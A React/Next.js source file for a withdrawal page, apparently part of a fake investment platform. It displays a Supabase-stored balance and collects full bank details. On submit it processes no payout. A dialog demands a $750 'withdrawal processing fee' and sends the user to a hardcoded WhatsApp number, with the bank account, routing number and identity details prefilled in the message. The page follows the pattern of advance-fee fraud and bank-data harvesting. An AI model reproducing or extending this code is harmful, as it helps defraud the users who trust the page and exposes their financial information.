'use client'

import { useEffect, useMemo, useState } from 'react'
import Link from 'next/link'
import { supabaseBrowser } from '@/lib/supabase/client'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { toast, Toaster } from 'sonner'
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from '@/components/ui/dialog'
import {
  ArrowRight,
  MessageCircle,
  ShieldCheck,
  Landmark,
  Building2,
  Wallet,
} from 'lucide-react'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select'

const FEE_AMOUNT = 750
const MIN_WITHDRAWAL = 5000

// For client-side env use NEXT_PUBLIC_*
const WHATSAPP_NUMBER = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER ?? '13476510876'

function formatMoneyUSD(amount: number) {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
  }).format(amount)
}

function parseAmount(input: string) {
  // allow "5,000" / "$5000" / "5000.00" etc
  const cleaned = input.replace(/[^0-9.]/g, '')
  if (!cleaned) return 0
  const n = Number(cleaned)
  return Number.isFinite(n) ? n : 0
}

export default function WithdrawPage() {
  const supabase = useMemo(() => supabaseBrowser(), [])

  const [open, setOpen] = useState(false)

  const [loadingProfile, setLoadingProfile] = useState(true)
  const [loadingBalance, setLoadingBalance] = useState(true)

  const [balance, setBalance] = useState<number>(0)

  const [profile, setProfile] = useState<{
    first_name?: string | null
    last_name?: string | null
    email?: string | null
    country?: string | null
    kyc_status?: string | null
  } | null>(null)

  const [form, setForm] = useState({
    amount: '',
    bankName: '',
    accountType: 'checking' as 'checking' | 'savings',
    routing: '',
    account: '',
    accountName: '',
    swift: '',
    beneficiaryAddress: '',
    note: '',
  })

  useEffect(() => {
    ;(async () => {
      try {
        const { data } = await supabase.auth.getUser()
        const user = data.user
        if (!user) return

        // profile
        const { data: p, error: pErr } = await supabase
          .from('profiles')
          .select('first_name,last_name,email,country,kyc_status')
          .eq('id', user.id)
          .maybeSingle()

        if (pErr) toast.error(pErr.message)

        setProfile({
          first_name: p?.first_name ?? null,
          last_name: p?.last_name ?? null,
          email: p?.email ?? user.email ?? null,
          country: p?.country ?? null,
          kyc_status: p?.kyc_status ?? 'unverified',
        })
      } finally {
        setLoadingProfile(false)
      }
    })()
  }, [supabase])

  useEffect(() => {
    ;(async () => {
      try {
        const { data } = await supabase.auth.getUser()
        const user = data.user
        if (!user) return

        const { data: b, error: bErr } = await supabase
          .from('balances')
          .select('amount')
          .eq('user_id', user.id)
          .maybeSingle()

        if (bErr) toast.error(bErr.message)

        setBalance(Number(b?.amount ?? 0))
      } finally {
        setLoadingBalance(false)
      }
    })()
  }, [supabase])

  const displayName =
    [profile?.first_name, profile?.last_name].filter(Boolean).join(' ') ||
    'User'
  const email = profile?.email ?? ''
  const country = profile?.country ?? '—'
  const kyc = (profile?.kyc_status ?? 'unverified') as string

  const amountNum = parseAmount(form.amount)

  // Validation rules
  const hasRequired =
    !!form.amount.trim() &&
    !!form.bankName.trim() &&
    !!form.accountName.trim() &&
    !!form.routing.trim() &&
    !!form.account.trim()

  const meetsMin = amountNum >= MIN_WITHDRAWAL
  const withinBalance = amountNum > 0 && amountNum <= balance

  const amountError = !form.amount.trim()
    ? null
    : !meetsMin
    ? `Minimum withdrawal is ${formatMoneyUSD(MIN_WITHDRAWAL)}`
    : !withinBalance
    ? `Amount exceeds your balance (${formatMoneyUSD(balance)})`
    : null

  const canSubmit =
    hasRequired &&
    meetsMin &&
    withinBalance &&
    !loadingBalance &&
    !loadingProfile

  const submit = () => {
    if (!hasRequired) return toast.error('Fill all required fields.')
    if (!meetsMin)
      return toast.error(
        `Minimum withdrawal is ${formatMoneyUSD(MIN_WITHDRAWAL)}.`
      )
    if (!withinBalance)
      return toast.error(`You cannot withdraw more than your balance.`)

    setOpen(true)
  }

  // WhatsApp message (full bank details, includes balance + min rule context)
  const message = [
    `Hi, I want to proceed with a withdrawal request.`,
    ``,
    `Withdrawal details:`,
    `• Amount: ${formatMoneyUSD(amountNum)} (${form.amount})`,
    `• Bank name: ${form.bankName}`,
    `• Account type: ${form.accountType}`,
    `• Account name: ${form.accountName}`,
    `• Routing number: ${form.routing}`,
    `• Account number: ${form.account}`,
    form.swift?.trim() ? `• SWIFT/BIC: ${form.swift.trim()}` : null,
    form.beneficiaryAddress?.trim()
      ? `• Beneficiary address: ${form.beneficiaryAddress.trim()}`
      : null,
    form.note?.trim() ? `• Note: ${form.note.trim()}` : null,
    ``,
    `Balance check:`,
    `• Current balance: ${formatMoneyUSD(balance)}`,
    `• Minimum withdrawal: ${formatMoneyUSD(MIN_WITHDRAWAL)}`,
    ``,
    `Fee notice:`,
    `• One-time withdrawal processing fee: ${formatMoneyUSD(FEE_AMOUNT)}`,
    ``,
    `User details:`,
    `• Name: ${displayName}`,
    email ? `• Email: ${email}` : null,
    `• Country: ${country}`,
    `• KYC: ${kyc}`,
    ``,
    `Reason: Payment of withdrawal fee and confirmation to proceed with payout processing.`,
  ]
    .filter(Boolean)
    .join('\n')

  const waLink = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(
    message
  )}`

  return (
    <div className='space-y-6'>
      <Toaster richColors />

      {/* Header */}
      <div className='flex flex-wrap items-end justify-between gap-3'>
        <div>
          <h1 className='text-2xl font-semibold tracking-tight text-zinc-900'>
            Withdraw
          </h1>
          <p className='text-sm text-zinc-500'>
            Submit an ACH request to continue.
          </p>
        </div>

        <div className='flex items-center gap-2'>
          <Badge className='rounded-2xl' variant='outline'>
            <ShieldCheck className='mr-1 h-3.5 w-3.5' />
            KYC: {loadingProfile ? 'Loading…' : kyc}
          </Badge>

          <Badge className='rounded-2xl' variant='outline'>
            <Wallet className='mr-1 h-3.5 w-3.5' />
            Balance: {loadingBalance ? 'Loading…' : formatMoneyUSD(balance)}
          </Badge>

          <Button asChild variant='outline' className='rounded-2xl bg-white'>
            <Link href='/dashboard'>Back</Link>
          </Button>
        </div>
      </div>

      {/* Form */}
      <Card className='relative overflow-hidden rounded-3xl border shadow-sm'>
        <div className='pointer-events-none absolute inset-0 bg-gradient-to-br from-emerald-500/10 via-sky-500/10 to-indigo-500/10' />
        <CardHeader className='relative'>
          <CardTitle className='text-base'>Bank details</CardTitle>
          <p className='text-sm text-zinc-500'>
            Minimum withdrawal is{' '}
            <span className='font-medium'>
              {formatMoneyUSD(MIN_WITHDRAWAL)}
            </span>
            .
          </p>
        </CardHeader>

        <CardContent className='relative grid gap-4'>
          <div className='grid gap-2'>
            <Label>Amount</Label>
            <Input
              className='rounded-2xl bg-white'
              placeholder='5000'
              value={form.amount}
              onChange={(e) => setForm({ ...form, amount: e.target.value })}
            />
            {amountError && (
              <p className='text-xs text-red-600'>{amountError}</p>
            )}
            {!amountError && form.amount.trim() && (
              <p className='text-xs text-zinc-500'>
                Parsed: {formatMoneyUSD(amountNum)}
              </p>
            )}
          </div>

          <div className='grid gap-4 md:grid-cols-2'>
            <div className='grid gap-2'>
              <Label>Bank name</Label>
              <div className='relative'>
                <Landmark className='pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-zinc-400' />
                <Input
                  className='rounded-2xl bg-white pl-9'
                  placeholder='Bank of America'
                  value={form.bankName}
                  onChange={(e) =>
                    setForm({ ...form, bankName: e.target.value })
                  }
                />
              </div>
            </div>

            <div className='grid gap-2'>
              <Label>Account type</Label>
              <Select
                value={form.accountType}
                onValueChange={(v) =>
                  setForm({ ...form, accountType: v as any })
                }
              >
                <SelectTrigger className='rounded-2xl bg-white'>
                  <SelectValue placeholder='Select type' />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value='checking'>Checking</SelectItem>
                  <SelectItem value='savings'>Savings</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className='grid gap-2'>
            <Label>Account name</Label>
            <div className='relative'>
              <Building2 className='pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-zinc-400' />
              <Input
                className='rounded-2xl bg-white pl-9'
                placeholder='John Doe'
                value={form.accountName}
                onChange={(e) =>
                  setForm({ ...form, accountName: e.target.value })
                }
              />
            </div>
          </div>

          <div className='grid gap-4 md:grid-cols-2'>
            <div className='grid gap-2'>
              <Label>Routing number</Label>
              <Input
                className='rounded-2xl bg-white'
                placeholder='XXXXXXXXX'
                value={form.routing}
                onChange={(e) => setForm({ ...form, routing: e.target.value })}
              />
            </div>

            <div className='grid gap-2'>
              <Label>Account number</Label>
              <Input
                className='rounded-2xl bg-white'
                placeholder='XXXXXXXXXXXX'
                value={form.account}
                onChange={(e) => setForm({ ...form, account: e.target.value })}
              />
            </div>
          </div>

          <div className='grid gap-4 md:grid-cols-2'>
            <div className='grid gap-2'>
              <Label>SWIFT / BIC (optional)</Label>
              <Input
                className='rounded-2xl bg-white'
                placeholder='BOFAUS3N'
                value={form.swift}
                onChange={(e) => setForm({ ...form, swift: e.target.value })}
              />
            </div>

            <div className='grid gap-2'>
              <Label>Beneficiary address (optional)</Label>
              <Input
                className='rounded-2xl bg-white'
                placeholder='Street, City, State'
                value={form.beneficiaryAddress}
                onChange={(e) =>
                  setForm({ ...form, beneficiaryAddress: e.target.value })
                }
              />
            </div>
          </div>

          <div className='grid gap-2'>
            <Label>Note / Reason (optional)</Label>
            <Input
              className='rounded-2xl bg-white'
              placeholder='e.g. Personal withdrawal'
              value={form.note}
              onChange={(e) => setForm({ ...form, note: e.target.value })}
            />
          </div>

          <Button
            className='rounded-2xl'
            onClick={submit}
            disabled={!canSubmit}
          >
            Submit request
          </Button>

          <p className='text-xs text-zinc-500'>
            Submit is enabled only when amount is at least{' '}
            {formatMoneyUSD(MIN_WITHDRAWAL)} and not above your balance.
          </p>
        </CardContent>
      </Card>

      {/* Fee prompt */}
      <Dialog open={open} onOpenChange={setOpen}>
        <DialogContent className='rounded-3xl'>
          <DialogHeader>
            <DialogTitle>Withdrawal fee required</DialogTitle>
            <DialogDescription>
              A one-time withdrawal processing fee of{' '}
              <span className='font-medium text-zinc-900'>
                {formatMoneyUSD(FEE_AMOUNT)}
              </span>{' '}
              is required to continue this request.
            </DialogDescription>
          </DialogHeader>

          <div className='mt-2 rounded-2xl border bg-zinc-50 p-4'>
            <p className='text-xs text-zinc-500'>Request summary</p>
            <div className='mt-2 grid gap-1 text-sm text-zinc-700'>
              <p>
                <span className='text-zinc-500'>Amount:</span>{' '}
                {formatMoneyUSD(amountNum)}
              </p>
              <p>
                <span className='text-zinc-500'>Bank:</span> {form.bankName}
              </p>
              <p>
                <span className='text-zinc-500'>Type:</span> {form.accountType}
              </p>
              <p>
                <span className='text-zinc-500'>Account name:</span>{' '}
                {form.accountName}
              </p>
              <p>
                <span className='text-zinc-500'>Routing:</span> {form.routing}
              </p>
              <p>
                <span className='text-zinc-500'>Account:</span> {form.account}
              </p>
              {!!form.swift.trim() && (
                <p>
                  <span className='text-zinc-500'>SWIFT/BIC:</span> {form.swift}
                </p>
              )}
              {!!form.beneficiaryAddress.trim() && (
                <p>
                  <span className='text-zinc-500'>Address:</span>{' '}
                  {form.beneficiaryAddress}
                </p>
              )}
              {!!form.note.trim() && (
                <p>
                  <span className='text-zinc-500'>Note:</span> {form.note}
                </p>
              )}

              <div className='pt-2 text-xs text-zinc-500'>
                Balance: {formatMoneyUSD(balance)} · Min:{' '}
                {formatMoneyUSD(MIN_WITHDRAWAL)}
              </div>
            </div>
          </div>

          <DialogFooter className='mt-4 flex flex-col gap-2 sm:flex-row sm:justify-end'>
            <Button
              variant='outline'
              className='rounded-2xl'
              onClick={() => setOpen(false)}
            >
              Cancel
            </Button>

            <a
              href={waLink}
              target='_blank'
              rel='noreferrer'
              className='w-full sm:w-auto'
            >
              <Button className='w-full rounded-2xl'>
                <MessageCircle className='mr-2 h-4 w-4' />
                Proceed on WhatsApp
                <ArrowRight className='ml-2 h-4 w-4' />
              </Button>
            </a>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  )
}
